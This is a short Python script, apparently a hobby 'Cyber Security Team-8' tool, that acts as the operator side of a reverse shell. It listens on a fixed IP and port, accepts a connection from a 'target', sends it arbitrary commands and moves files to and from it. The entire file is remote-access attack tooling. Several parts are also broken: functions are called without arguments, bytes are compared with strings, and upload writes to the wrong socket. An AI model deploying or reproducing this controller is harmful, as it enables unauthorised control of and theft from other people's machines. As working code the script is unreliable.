import socket
import os
import subprocess

listener_ip = '192.168.0.119'
listener_port = 6996

banner = """
    ______      __                 _____                      _ __ 
  / ____/_  __/ /_  ___  _____   / ___/___  _______  _______(_) /___  __
 / /   / / / / __ \/ _ \/ ___/   \__ \/ _ \/ ___/ / / / ___/ / __/ / / /
/ /___/ /_/ / /_/ /  __/ /      ___/ /  __/ /__/ /_/ / /  / / /_/ /_/ / 
\____/\__, /_.___/\___/_/      /____/\___/\___/\__,_/_/  /_/\__/\__, /  
  ___/____/                              ____                  /____/   
 /_  __/__  ____ _____ ___              ( __ )                          
  / / / _ \/ __ `/ __ `__ \   ______   / __  |                          
 / / /  __/ /_/ / / / / / /  /_____/  / /_/ /                           
/_/  \___/\__,_/_/ /_/ /_/            \____/                            

Firts time huh? Enter "help" command for help
												                         """


def download(file_name):
    file = os.path.join(os.path.dirname(file_name))
    file_recv = open(file, 'wb')
    data_recv = target.recv(2048)
    file_recv.write(data_recv)
    file_recv.close()

def upload(file_name):
    file_upload = open(file_name, 'rb')
    data_to_send = file_upload.read()
    sock.send(data_to_send.encode())

def shell_command():
    while True:
        command = input("[-] RemoteCommand~#: ")
        command = command.encode()
        target.send(command)
        if command == 'q':
            target.close()
            break
        elif command == "help":
            continue
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:5] == 'mkdir' and len(command) > 1:
            continue
        elif command[:8] == 'download' and len(command) > 1:
            try:
                download()
            except:
                continue
        elif command[:6] == 'upload' and len(command) > 1:
            try:
                upload()
            except:
                continue
        else:
            result = target.recv(2048)
            result = result.decode()
            print(result)

def listener():
    global sock
    global ip
    global target
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    sock.bind((listener_ip, listener_port))
    sock.listen()
    print("[+] Listening for target ...\n")
    target, ip = sock.accept()
    print("[+] Get connection from target. Starting shell command...\n")

if __name__ == "__main__":
    print(banner)
    listener()
    shell_command()
    sock.close()